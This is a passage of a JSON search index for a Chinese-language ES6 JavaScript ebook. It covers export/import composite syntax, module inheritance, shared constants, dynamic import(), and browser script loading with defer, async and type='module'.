default</code>\u4e5f\u53ef\u4ee5\u7528\u6765\u8f93\u51fa\u7c7b\u3002</p> <pre><code>// MyClass.js\nexport default class { ... }\n\n// main.js\nimport MyClass from 'MyClass';\nlet o = new MyClass();\n</code></pre>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#export-import","title":"export \u4e0e import \u7684\u590d\u5408\u5199\u6cd5","text":"<p>\u5982\u679c\u5728\u4e00\u4e2a\u6a21\u5757\u4e4b\u4e2d\uff0c\u5148\u8f93\u5165\u540e\u8f93\u51fa\u540c\u4e00\u4e2a\u6a21\u5757\uff0c<code>import</code>\u8bed\u53e5\u53ef\u4ee5\u4e0e<code>export</code>\u8bed\u53e5\u5199\u5728\u4e00\u8d77\u3002</p> <pre><code>export { foo, bar } from 'my_module';\n\n// \u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\nimport { foo, bar } from 'my_module';\nexport { foo, bar };\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>export</code>\u548c<code>import</code>\u8bed\u53e5\u53ef\u4ee5\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u5199\u6210\u4e00\u884c\u3002\u4f46\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5199\u6210\u4e00\u884c\u4ee5\u540e\uff0c<code>foo</code>\u548c<code>bar</code>\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u88ab\u5bfc\u5165\u5f53\u524d\u6a21\u5757\uff0c\u53ea\u662f\u76f8\u5f53\u4e8e\u5bf9\u5916\u8f6c\u53d1\u4e86\u8fd9\u4e24\u4e2a\u63a5\u53e3\uff0c\u5bfc\u81f4\u5f53\u524d\u6a21\u5757\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528<code>foo</code>\u548c<code>bar</code>\u3002</p> <p>\u6a21\u5757\u7684\u63a5\u53e3\u6539\u540d\u548c\u6574\u4f53\u8f93\u51fa\uff0c\u4e5f\u53ef\u4ee5\u91c7\u7528\u8fd9\u79cd\u5199\u6cd5\u3002</p> <pre><code>// \u63a5\u53e3\u6539\u540d\nexport { foo as myFoo } from 'my_module';\n\n// \u6574\u4f53\u8f93\u51fa\nexport * from 'my_module';\n</code></pre> <p>\u9ed8\u8ba4\u63a5\u53e3\u7684\u5199\u6cd5\u5982\u4e0b\u3002</p> <pre><code>export { default } from 'foo';\n</code></pre> <p>\u5177\u540d\u63a5\u53e3\u6539\u4e3a\u9ed8\u8ba4\u63a5\u53e3\u7684\u5199\u6cd5\u5982\u4e0b\u3002</p> <pre><code>export { es6 as default } from './someModule';\n\n// \u7b49\u540c\u4e8e\nimport { es6 } from './someModule';\nexport default es6;\n</code></pre> <p>\u540c\u6837\u5730\uff0c\u9ed8\u8ba4\u63a5\u53e3\u4e5f\u53ef\u4ee5\u6539\u540d\u4e3a\u5177\u540d\u63a5\u53e3\u3002</p> <pre><code>export { default as es6 } from './someModule';\n</code></pre> <p>\u4e0b\u9762\u4e09\u79cd<code>import</code>\u8bed\u53e5\uff0c\u6ca1\u6709\u5bf9\u5e94\u7684\u590d\u5408\u5199\u6cd5\u3002</p> <pre><code>import * as someIdentifier from \"someModule\";\nimport someIdentifier from \"someModule\";\nimport someIdentifier, { namedIdentifier } from \"someModule\";\n</code></pre> <p>\u4e3a\u4e86\u505a\u5230\u5f62\u5f0f\u7684\u5bf9\u79f0\uff0c\u73b0\u5728\u6709\u63d0\u6848\uff0c\u63d0\u51fa\u8865\u4e0a\u8fd9\u4e09\u79cd\u590d\u5408\u5199\u6cd5\u3002</p> <pre><code>export * as someIdentifier from \"someModule\";\nexport someIdentifier from \"someModule\";\nexport someIdentifier, { namedIdentifier } from \"someModule\";\n</code></pre>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#_4","title":"\u6a21\u5757\u7684\u7ee7\u627f","text":"<p>\u6a21\u5757\u4e4b\u95f4\u4e5f\u53ef\u4ee5\u7ee7\u627f\u3002</p> <p>\u5047\u8bbe\u6709\u4e00\u4e2a<code>circleplus</code>\u6a21\u5757\uff0c\u7ee7\u627f\u4e86<code>circle</code>\u6a21\u5757\u3002</p> <pre><code>// circleplus.js\n\nexport * from 'circle';\nexport var e = 2.71828182846;\nexport default function(x) {\n  return Math.exp(x);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684<code>export *</code>\uff0c\u8868\u793a\u518d\u8f93\u51fa<code>circle</code>\u6a21\u5757\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u6ce8\u610f\uff0c<code>export *</code>\u547d\u4ee4\u4f1a\u5ffd\u7565<code>circle</code>\u6a21\u5757\u7684<code>default</code>\u65b9\u6cd5\u3002\u7136\u540e\uff0c\u4e0a\u9762\u4ee3\u7801\u53c8\u8f93\u51fa\u4e86\u81ea\u5b9a\u4e49\u7684<code>e</code>\u53d8\u91cf\u548c\u9ed8\u8ba4\u65b9\u6cd5\u3002</p> <p>\u8fd9\u65f6\uff0c\u4e5f\u53ef\u4ee5\u5c06<code>circle</code>\u7684\u5c5e\u6027\u6216\u65b9\u6cd5\uff0c\u6539\u540d\u540e\u518d\u8f93\u51fa\u3002</p> <pre><code>// circleplus.js\n\nexport { area as circleArea } from 'circle';\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u53ea\u8f93\u51fa<code>circle</code>\u6a21\u5757\u7684<code>area</code>\u65b9\u6cd5\uff0c\u4e14\u5c06\u5176\u6539\u540d\u4e3a<code>circleArea</code>\u3002</p> <p>\u52a0\u8f7d\u4e0a\u9762\u6a21\u5757\u7684\u5199\u6cd5\u5982\u4e0b\u3002</p> <pre><code>// main.js\n\nimport * as math from 'circleplus';\nimport exp from 'circleplus';\nconsole.log(exp(math.e));\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684<code>import exp</code>\u8868\u793a\uff0c\u5c06<code>circleplus</code>\u6a21\u5757\u7684\u9ed8\u8ba4\u65b9\u6cd5\u52a0\u8f7d\u4e3a<code>exp</code>\u65b9\u6cd5\u3002</p>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#_5","title":"\u8de8\u6a21\u5757\u5e38\u91cf","text":"<p>\u672c\u4e66\u4ecb\u7ecd<code>const</code>\u547d\u4ee4\u7684\u65f6\u5019\u8bf4\u8fc7\uff0c<code>const</code>\u58f0\u660e\u7684\u5e38\u91cf\u53ea\u5728\u5f53\u524d\u4ee3\u7801\u5757\u6709\u6548\u3002\u5982\u679c\u60f3\u8bbe\u7f6e\u8de8\u6a21\u5757\u7684\u5e38\u91cf\uff08\u5373\u8de8\u591a\u4e2a\u6587\u4ef6\uff09\uff0c\u6216\u8005\u8bf4\u4e00\u4e2a\u503c\u8981\u88ab\u591a\u4e2a\u6a21\u5757\u5171\u4eab\uff0c\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>// constants.js \u6a21\u5757\nexport const A = 1;\nexport const B = 3;\nexport const C = 4;\n\n// test1.js \u6a21\u5757\nimport * as constants from './constants';\nconsole.log(constants.A); // 1\nconsole.log(constants.B); // 3\n\n// test2.js \u6a21\u5757\nimport {A, B} from './constants';\nconsole.log(A); // 1\nconsole.log(B); // 3\n</code></pre> <p>\u5982\u679c\u8981\u4f7f\u7528\u7684\u5e38\u91cf\u975e\u5e38\u591a\uff0c\u53ef\u4ee5\u5efa\u4e00\u4e2a\u4e13\u95e8\u7684<code>constants</code>\u76ee\u5f55\uff0c\u5c06\u5404\u79cd\u5e38\u91cf\u5199\u5728\u4e0d\u540c\u7684\u6587\u4ef6\u91cc\u9762\uff0c\u4fdd\u5b58\u5728\u8be5\u76ee\u5f55\u4e0b\u3002</p> <pre><code>// constants/db.js\nexport const db = {\n  url: 'http://my.couchdbserver.local:5984',\n  admin_username: 'admin',\n  admin_password: 'admin password'\n};\n\n// constants/user.js\nexport const users = ['root', 'admin', 'staff', 'ceo', 'chief', 'moderator'];\n</code></pre> <p>\u7136\u540e\uff0c\u5c06\u8fd9\u4e9b\u6587\u4ef6\u8f93\u51fa\u7684\u5e38\u91cf\uff0c\u5408\u5e76\u5728<code>index.js</code>\u91cc\u9762\u3002</p> <pre><code>// constants/index.js\nexport {db} from './db';\nexport {users} from './users';\n</code></pre> <p>\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u76f4\u63a5\u52a0\u8f7d<code>index.js</code>\u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>// script.js\nimport {db, users} from './constants/index';\n</code></pre>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#import_1","title":"import()","text":""},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#_6","title":"\u7b80\u4ecb","text":"<p>\u524d\u9762\u4ecb\u7ecd\u8fc7\uff0c<code>import</code>\u547d\u4ee4\u4f1a\u88ab JavaScript \u5f15\u64ce\u9759\u6001\u5206\u6790\uff0c\u5148\u4e8e\u6a21\u5757\u5185\u7684\u5176\u4ed6\u8bed\u53e5\u6267\u884c\uff08<code>import</code>\u547d\u4ee4\u53eb\u505a\u201c\u8fde\u63a5\u201d binding \u5176\u5b9e\u66f4\u5408\u9002\uff09\u3002\u6240\u4ee5\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u4f1a\u62a5\u9519\u3002</p> <pre><code>// \u62a5\u9519\nif (x === 2) {\n  import MyModual from './myModual';\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f15\u64ce\u5904\u7406<code>import</code>\u8bed\u53e5\u662f\u5728\u7f16\u8bd1\u65f6\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u53bb\u5206\u6790\u6216\u6267\u884c<code>if</code>\u8bed\u53e5\uff0c\u6240\u4ee5<code>import</code>\u8bed\u53e5\u653e\u5728<code>if</code>\u4ee3\u7801\u5757\u4e4b\u4e2d\u6beb\u65e0\u610f\u4e49\uff0c\u56e0\u6b64\u4f1a\u62a5\u53e5\u6cd5\u9519\u8bef\uff0c\u800c\u4e0d\u662f\u6267\u884c\u65f6\u9519\u8bef\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c<code>import</code>\u548c<code>export</code>\u547d\u4ee4\u53ea\u80fd\u5728\u6a21\u5757\u7684\u9876\u5c42\uff0c\u4e0d\u80fd\u5728\u4ee3\u7801\u5757\u4e4b\u4e2d\uff08\u6bd4\u5982\uff0c\u5728<code>if</code>\u4ee3\u7801\u5757\u4e4b\u4e2d\uff0c\u6216\u5728\u51fd\u6570\u4e4b\u4e2d\uff09\u3002</p> <p>\u8fd9\u6837\u7684\u8bbe\u8ba1\uff0c\u56fa\u7136\u6709\u5229\u4e8e\u7f16\u8bd1\u5668\u63d0\u9ad8\u6548\u7387\uff0c\u4f46\u4e5f\u5bfc\u81f4\u65e0\u6cd5\u5728\u8fd0\u884c\u65f6\u52a0\u8f7d\u6a21\u5757\u3002\u5728\u8bed\u6cd5\u4e0a\uff0c\u6761\u4ef6\u52a0\u8f7d\u5c31\u4e0d\u53ef\u80fd\u5b9e\u73b0\u3002\u5982\u679c<code>import</code>\u547d\u4ee4\u8981\u53d6\u4ee3 Node \u7684<code>require</code>\u65b9\u6cd5\uff0c\u8fd9\u5c31\u5f62\u6210\u4e86\u4e00\u4e2a\u969c\u788d\u3002\u56e0\u4e3a<code>require</code>\u662f\u8fd0\u884c\u65f6\u52a0\u8f7d\u6a21\u5757\uff0c<code>import</code>\u547d\u4ee4\u65e0\u6cd5\u53d6\u4ee3<code>require</code>\u7684\u52a8\u6001\u52a0\u8f7d\u529f\u80fd\u3002</p> <pre><code>const path = './' + fileName;\nconst myModual = require(path);\n</code></pre> <p>\u4e0a\u9762\u7684\u8bed\u53e5\u5c31\u662f\u52a8\u6001\u52a0\u8f7d\uff0c<code>require</code>\u5230\u5e95\u52a0\u8f7d\u54ea\u4e00\u4e2a\u6a21\u5757\uff0c\u53ea\u6709\u8fd0\u884c\u65f6\u624d\u77e5\u9053\u3002<code>import</code>\u547d\u4ee4\u505a\u4e0d\u5230\u8fd9\u4e00\u70b9\u3002</p> <p>\u73b0\u5728\u8fd9\u8fd8\u662f\u4e00\u4e2a\u63d0\u6848</p> <p>\u56e0\u6b64\uff0c\u6709\u4e00\u4e2a\u63d0\u6848\uff0c\u5efa\u8bae\u5f15\u5165<code>import()</code>\u51fd\u6570\uff0c\u5b8c\u6210\u52a8\u6001\u52a0\u8f7d\u3002</p> <pre><code>import(specifier)\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>import</code>\u51fd\u6570\u7684\u53c2\u6570<code>specifier</code>\uff0c\u6307\u5b9a\u6240\u8981\u52a0\u8f7d\u7684\u6a21\u5757\u7684\u4f4d\u7f6e\u3002<code>import</code>\u547d\u4ee4\u80fd\u591f\u63a5\u53d7\u4ec0\u4e48\u53c2\u6570\uff0c<code>import()</code>\u51fd\u6570\u5c31\u80fd\u63a5\u53d7\u4ec0\u4e48\u53c2\u6570\uff0c\u4e24\u8005\u533a\u522b\u4e3b\u8981\u662f\u540e\u8005\u4e3a\u52a8\u6001\u52a0\u8f7d\u3002</p> <p><code>import()</code>\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const main = document.querySelector('main');\n\nimport(`./section-modules/${someVariable}.js`)\n  .then(module =&gt; {\n    module.loadPageInto(main);\n  })\n  .catch(err =&gt; {\n    main.textContent = err.message;\n  });\n</code></pre> <p><code>import()</code>\u51fd\u6570\u53ef\u4ee5\u7528\u5728\u4efb\u4f55\u5730\u65b9\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6a21\u5757\uff0c\u975e\u6a21\u5757\u7684\u811a\u672c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u3002\u5b83\u662f\u8fd0\u884c\u65f6\u6267\u884c\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4ec0\u4e48\u65f6\u5019\u8fd0\u884c\u5230\u8fd9\u4e00\u53e5\uff0c\u5c31\u4f1a\u52a0\u8f7d\u6307\u5b9a\u7684\u6a21\u5757\u3002\u53e6\u5916\uff0c<code>import()</code>\u51fd\u6570\u4e0e\u6240\u52a0\u8f7d\u7684\u6a21\u5757\u6ca1\u6709\u9759\u6001\u8fde\u63a5\u5173\u7cfb\uff0c\u8fd9\u70b9\u4e5f\u662f\u4e0e<code>import</code>\u8bed\u53e5\u4e0d\u76f8\u540c\u3002<code>import()</code>\u7c7b\u4f3c\u4e8e Node \u7684<code>require</code>\u65b9\u6cd5\uff0c\u533a\u522b\u4e3b\u8981\u662f\u524d\u8005\u662f\u5f02\u6b65\u52a0\u8f7d\uff0c\u540e\u8005\u662f\u540c\u6b65\u52a0\u8f7d\u3002</p>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#_7","title":"\u9002\u7528\u573a\u5408","text":"<p>\u4e0b\u9762\u662f<code>import()</code>\u7684\u4e00\u4e9b\u9002\u7528\u573a\u5408\u3002</p> <p>\uff081\uff09\u6309\u9700\u52a0\u8f7d\u3002</p> <p><code>import()</code>\u53ef\u4ee5\u5728\u9700\u8981\u7684\u65f6\u5019\uff0c\u518d\u52a0\u8f7d\u67d0\u4e2a\u6a21\u5757\u3002</p> <pre><code>button.addEventListener('click', event =&gt; {\n  import('./dialogBox.js')\n  .then(dialogBox =&gt; {\n    dialogBox.open();\n  })\n  .catch(error =&gt; {\n    /* Error handling */\n  })\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>import()</code>\u65b9\u6cd5\u653e\u5728<code>click</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u4e4b\u4e2d\uff0c\u53ea\u6709\u7528\u6237\u70b9\u51fb\u4e86\u6309\u94ae\uff0c\u624d\u4f1a\u52a0\u8f7d\u8fd9\u4e2a\u6a21\u5757\u3002</p> <p>\uff082\uff09\u6761\u4ef6\u52a0\u8f7d</p> <p><code>import()</code>\u53ef\u4ee5\u653e\u5728<code>if</code>\u4ee3\u7801\u5757\uff0c\u6839\u636e\u4e0d\u540c\u7684\u60c5\u51b5\uff0c\u52a0\u8f7d\u4e0d\u540c\u7684\u6a21\u5757\u3002</p> <pre><code>if (condition) {\n  import('moduleA').then(...);\n} else {\n  import('moduleB').then(...);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\uff0c\u5c31\u52a0\u8f7d\u6a21\u5757 A\uff0c\u5426\u5219\u52a0\u8f7d\u6a21\u5757 B\u3002</p> <p>\uff083\uff09\u52a8\u6001\u7684\u6a21\u5757\u8def\u5f84</p> <p><code>import()</code>\u5141\u8bb8\u6a21\u5757\u8def\u5f84\u52a8\u6001\u751f\u6210\u3002</p> <pre><code>import(f())\n.then(...);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6839\u636e\u51fd\u6570<code>f</code>\u7684\u8fd4\u56de\u7ed3\u679c\uff0c\u52a0\u8f7d\u4e0d\u540c\u7684\u6a21\u5757\u3002</p>"},{"location":"ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/#_8","title":"\u6ce8\u610f\u70b9","text":"<p><code>import()</code>\u52a0\u8f7d\u6a21\u5757\u6210\u529f\u4ee5\u540e\uff0c\u8fd9\u4e2a\u6a21\u5757\u4f1a\u4f5c\u4e3a\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5f53\u4f5c<code>then</code>\u65b9\u6cd5\u7684\u53c2\u6570\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u4f7f\u7528\u5bf9\u8c61\u89e3\u6784\u8d4b\u503c\u7684\u8bed\u6cd5\uff0c\u83b7\u53d6\u8f93\u51fa\u63a5\u53e3\u3002</p> <pre><code>import('./myModule.js')\n.then(({export1, export2}) =&gt; {\n  // ...\u00b7\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>export1</code>\u548c<code>export2</code>\u90fd\u662f<code>myModule.js</code>\u7684\u8f93\u51fa\u63a5\u53e3\uff0c\u53ef\u4ee5\u89e3\u6784\u83b7\u5f97\u3002</p> <p>\u5982\u679c\u6a21\u5757\u6709<code>default</code>\u8f93\u51fa\u63a5\u53e3\uff0c\u53ef\u4ee5\u7528\u53c2\u6570\u76f4\u63a5\u83b7\u5f97\u3002</p> <pre><code>import('./myModule.js')\n.then(myModule =&gt; {\n  console.log(myModule.default);\n});\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5177\u540d\u8f93\u5165\u7684\u5f62\u5f0f\u3002</p> <pre><code>import('./myModule.js')\n.then(({default: theDefault}) =&gt; {\n  console.log(theDefault);\n});\n</code></pre> <p>\u5982\u679c\u60f3\u540c\u65f6\u52a0\u8f7d\u591a\u4e2a\u6a21\u5757\uff0c\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>Promise.all([\n  import('./module1.js'),\n  import('./module2.js'),\n  import('./module3.js'),\n])\n.then(([module1, module2, module3]) =&gt; {\n   \u00b7\u00b7\u00b7\n});\n</code></pre> <p><code>import()</code>\u4e5f\u53ef\u4ee5\u7528\u5728 async \u51fd\u6570\u4e4b\u4e2d\u3002</p> <pre><code>async function main() {\n  const myModule = await import('./myModule.js');\n  const {export1, export2} = await import('./myModule.js');\n  const [module1, module2, module3] =\n    await Promise.all([\n      import('./module1.js'),\n      import('./module2.js'),\n      import('./module3.js'),\n    ]);\n}\nmain();\n</code></pre>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/","title":"Module \u7684\u52a0\u8f7d\u5b9e\u73b0","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 27489  \u9605\u8bfb55\u5206\u949f</p> <p>\u4e0a\u4e00\u7ae0\u4ecb\u7ecd\u4e86\u6a21\u5757\u7684\u8bed\u6cd5\uff0c\u672c\u7ae0\u4ecb\u7ecd\u5982\u4f55\u5728\u6d4f\u89c8\u5668\u548c Node \u4e4b\u4e2d\u52a0\u8f7d ES6 \u6a21\u5757\uff0c\u4ee5\u53ca\u5b9e\u9645\u5f00\u53d1\u4e2d\u7ecf\u5e38\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\uff08\u6bd4\u5982\u5faa\u73af\u52a0\u8f7d\uff09\u3002</p>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#_1","title":"\u6d4f\u89c8\u5668\u52a0\u8f7d","text":""},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#_2","title":"\u4f20\u7edf\u65b9\u6cd5","text":"<p>HTML \u7f51\u9875\u4e2d\uff0c\u6d4f\u89c8\u5668\u901a\u8fc7<code>&lt;script&gt;</code>\u6807\u7b7e\u52a0\u8f7d JavaScript \u811a\u672c\u3002</p> <pre><code>&lt;!-- \u9875\u9762\u5185\u5d4c\u7684\u811a\u672c --&gt;\n&lt;script type=\"application/javascript\"&gt;\n  // module code\n&lt;/script&gt;\n\n&lt;!-- \u5916\u90e8\u811a\u672c --&gt;\n&lt;script type=\"application/javascript\" src=\"path/to/myModule.js\"&gt;\n&lt;/script&gt;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6d4f\u89c8\u5668\u811a\u672c\u7684\u9ed8\u8ba4\u8bed\u8a00\u662f JavaScript\uff0c\u56e0\u6b64<code>type=\"application/javascript\"</code>\u53ef\u4ee5\u7701\u7565\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6d4f\u89c8\u5668\u662f\u540c\u6b65\u52a0\u8f7d JavaScript \u811a\u672c\uff0c\u5373\u6e32\u67d3\u5f15\u64ce\u9047\u5230<code>&lt;script&gt;</code>\u6807\u7b7e\u5c31\u4f1a\u505c\u4e0b\u6765\uff0c\u7b49\u5230\u6267\u884c\u5b8c\u811a\u672c\uff0c\u518d\u7ee7\u7eed\u5411\u4e0b\u6e32\u67d3\u3002\u5982\u679c\u662f\u5916\u90e8\u811a\u672c\uff0c\u8fd8\u5fc5\u987b\u52a0\u5165\u811a\u672c\u4e0b\u8f7d\u7684\u65f6\u95f4\u3002</p> <p>\u5982\u679c\u811a\u672c\u4f53\u79ef\u5f88\u5927\uff0c\u4e0b\u8f7d\u548c\u6267\u884c\u7684\u65f6\u95f4\u5c31\u4f1a\u5f88\u957f\uff0c\u56e0\u6b64\u9020\u6210\u6d4f\u89c8\u5668\u5835\u585e\uff0c\u7528\u6237\u4f1a\u611f\u89c9\u5230\u6d4f\u89c8\u5668\u201c\u5361\u6b7b\u201d\u4e86\uff0c\u6ca1\u6709\u4efb\u4f55\u54cd\u5e94\u3002\u8fd9\u663e\u7136\u662f\u5f88\u4e0d\u597d\u7684\u4f53\u9a8c\uff0c\u6240\u4ee5\u6d4f\u89c8\u5668\u5141\u8bb8\u811a\u672c\u5f02\u6b65\u52a0\u8f7d\uff0c\u4e0b\u9762\u5c31\u662f\u4e24\u79cd\u5f02\u6b65\u52a0\u8f7d\u7684\u8bed\u6cd5\u3002</p> <pre><code>&lt;script src=\"path/to/myModule.js\" defer&gt;&lt;/script&gt;\n&lt;script src=\"path/to/myModule.js\" async&gt;&lt;/script&gt;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>&lt;script&gt;</code>\u6807\u7b7e==\u6253\u5f00<code>defer</code>\u6216<code>async</code>\u5c5e\u6027\uff0c\u811a\u672c\u5c31\u4f1a\u5f02\u6b65\u52a0\u8f7d==\u3002\u6e32\u67d3\u5f15\u64ce\u9047\u5230\u8fd9\u4e00\u884c\u547d\u4ee4\uff0c\u5c31\u4f1a\u5f00\u59cb\u4e0b\u8f7d\u5916\u90e8\u811a\u672c\uff0c\u4f46\u4e0d\u4f1a\u7b49\u5b83\u4e0b\u8f7d\u548c\u6267\u884c\uff0c\u800c\u662f\u76f4\u63a5\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4\u3002</p> <p><code>defer</code>\u4e0e<code>async</code>\u7684\u533a\u522b\u662f\uff1a<code>defer</code>\u8981\u7b49\u5230\u6574\u4e2a\u9875\u9762\u5728\u5185\u5b58\u4e2d\u6b63\u5e38\u6e32\u67d3\u7ed3\u675f\uff08DOM \u7ed3\u6784\u5b8c\u5168\u751f\u6210\uff0c\u4ee5\u53ca\u5176\u4ed6\u811a\u672c\u6267\u884c\u5b8c\u6210\uff09\uff0c\u624d\u4f1a\u6267\u884c\uff1b<code>async</code>\u4e00\u65e6\u4e0b\u8f7d\u5b8c\uff0c\u6e32\u67d3\u5f15\u64ce\u5c31\u4f1a\u4e2d\u65ad\u6e32\u67d3\uff0c\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u4ee5\u540e\uff0c\u518d\u7ee7\u7eed\u6e32\u67d3\u3002\u4e00\u53e5\u8bdd\uff0c<code>defer</code>\u662f\u201c\u6e32\u67d3\u5b8c\u518d\u6267\u884c\u201d\uff0c<code>async</code>\u662f\u201c\u4e0b\u8f7d\u5b8c\u5c31\u6267\u884c\u201d\u3002\u53e6\u5916\uff0c\u5982\u679c\u6709\u591a\u4e2a<code>defer</code>\u811a\u672c\uff0c\u4f1a\u6309\u7167\u5b83\u4eec\u5728\u9875\u9762\u51fa\u73b0\u7684\u987a\u5e8f\u52a0\u8f7d\uff0c\u800c\u591a\u4e2a<code>async</code>\u811a\u672c\u662f\u4e0d\u80fd\u4fdd\u8bc1\u52a0\u8f7d\u987a\u5e8f\u7684\u3002</p>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#_3","title":"\u52a0\u8f7d\u89c4\u5219","text":"<p>\u6d4f\u89c8\u5668\u52a0\u8f7d ES6 \u6a21\u5757\uff0c\u4e5f\u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\uff0c\u4f46\u662f\u8981\u52a0\u5165<code>type=\"module\"</code>\u5c5e\u6027\u3002</p> <pre><code>&lt;script type=\"module\" src=\"./foo.js\"&gt;&lt;/script&gt;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5728\u7f51\u9875\u4e2d\u63d2\u5165\u4e00\u4e2a\u6a21\u5757<code>foo.js</code>\uff0c\u7531\u4e8e<code>type</code>\u5c5e\u6027\u8bbe\u4e3a<code>module</code>\uff0c\u6240\u4ee5\u6d4f\u89c8\u5668\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a ES6 \u6a21\u5757\u3002</p> <p>\u6d4f\u89c8\u5668\u5bf9\u4e8e\u5e26\u6709<code>type=\"module\"</code>\u7684<code>&lt;script&gt;</code>\uff0c\u90fd\u662f\u5f02\u6b65\u52a0\u8f7d\uff0c\u4e0d\u4f1a\u9020\u6210\u5835\u585e\u6d4f\u89c8\u5668\uff0c\u5373\u7b49\u5230\u6574\u4e2a\u9875\u9762\u6e32\u67d3\u5b8c\uff0c\u518d\u6267\u884c\u6a21\u5757\u811a\u672c\uff0c\u7b49\u540c\u4e8e\u6253\u5f00\u4e86<code>&lt;script&gt;</code>\u6807\u7b7e\u7684<code>defer</code>\u5c5e\u6027\u3002</p> <pre><code>&lt;script type=\"module\" src=\"./foo.js\"&gt;&lt;/script&gt;\n&lt;!-- \u7b49\u540c\u4e8e --&gt;\n&lt;script type=\"module\" src=\"./foo.js\" defer&gt;&lt;/script&gt;\n</code></pre> <p>\u5982\u679c\u7f51\u9875\u6709\u591a\u4e2a<code>&lt;script type=\"module\"&gt;</code>\uff0c\u5b83\u4eec\u4f1a\u6309\u7167\u5728\u9875\u9762\u51fa\u73b0\u7684\u987a\u5e8f\u4f9d\u6b21\u6267\u884c\u3002</p> <p><code>&lt;script&gt;</code> \u6807\u7b7e\u7684async\u5c5e\u6027\u4e5f\u53ef\u4ee5\u6253\u5f00\uff0c\u8fd9\u65f6\u53ea\u8981\u52a0\u8f7d\u5b8c\u6210\uff0c\u6e32\u67d3\u5f15\u64ce\u5c31\u4f1a\u4e2d\u65ad\u6e32\u67d3\u7acb\u5373\u6267\u884c\u3002\u6267\u884c\u5b8c\u6210\u540e\uff0c\u518d\u6062\u590d\u6e32\u67d3\u3002</p> <pre><code>&lt;script type=\"module\" src=\"./foo.js\" async&gt;&lt;/script&gt;\n</code></pre> <p>\u4e00\u65e6\u4f7f\u7528\u4e86<code>async</code>\u5c5e\u6027\uff0c<code>&lt;script type=\"module\"&gt;</code>\u5c31\u4e0d\u4f1a\u6309\u7167\u5728\u9875\u9762\u51fa\u73b0\u7684\u987a\u5e8f\u6267\u884c\uff0c\u800c\u662f\u53ea\u8981\u8be5\u6a21\u5757\u52a0\u8f7d\u5b8c\u6210\uff0c\u5c31\u6267\u884c\u8be5\u6a21\u5757\u3002</p> <p>ES6 